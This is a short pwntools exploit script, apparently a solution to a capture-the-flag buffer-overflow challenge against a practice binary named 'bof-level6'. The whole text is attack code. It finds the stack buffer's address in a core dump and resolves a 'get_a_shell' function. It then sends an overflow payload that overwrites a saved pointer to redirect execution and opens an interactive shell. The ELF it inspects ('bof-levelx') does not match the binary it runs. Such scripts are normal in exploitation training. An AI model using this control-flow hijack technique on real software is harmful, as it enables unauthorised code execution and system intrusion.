#!/usr/bin/env python

from pwn import *

buf = "A" * 0x80

c = Core('./core')

buffer_address = c.stack.find(buf)
print("Buffer Address:", hex(buffer_address))

e = ELF('./bof-levelx')
get_a_shell_address = e.symbols['get_a_shell']


#RUN EXPLOIT

p = process("./bof-level6")

p.sendline("AAAAAAAA" + p64(get_a_shell_address) + "B" * (0x80 - 16) + p64(buffer_address))

p.interactive()
